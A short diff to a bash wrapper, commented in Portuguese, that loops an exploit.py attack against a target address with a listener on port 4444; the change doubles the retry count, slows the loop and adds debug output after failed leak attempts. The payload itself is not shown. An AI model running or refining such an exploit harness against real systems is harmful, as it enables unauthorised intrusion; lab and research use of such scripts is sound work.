@@ -20,7 +20,7 @@ TARGET="${1:-${IP:-192.168.127.10}}"
 TPORT="${2:-80}"
 LPORT=4444
 SPORT=8080
-MAX_ATTEMPTS=15
+MAX_ATTEMPTS=30
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 EXPLOIT="$SCRIPT_DIR/exploit.py"
@@ -147,10 +147,11 @@ for i in $(seq 1 $MAX_ATTEMPTS); do
     elif echo "$LAST" | grep -q "candidates=0"; then
         echo -e "leak falhou ${YELLOW}(sem candidates)${NC}"
     else
-        echo "sem sucesso"
+        # Mostra última linha real para debug
+        echo "sem sucesso: $(echo "$LAST" | head -c 60)"
     fi
 
-    sleep 2
+    sleep 3
 done
 
 if [ $SUCCESS -eq 0 ]; then
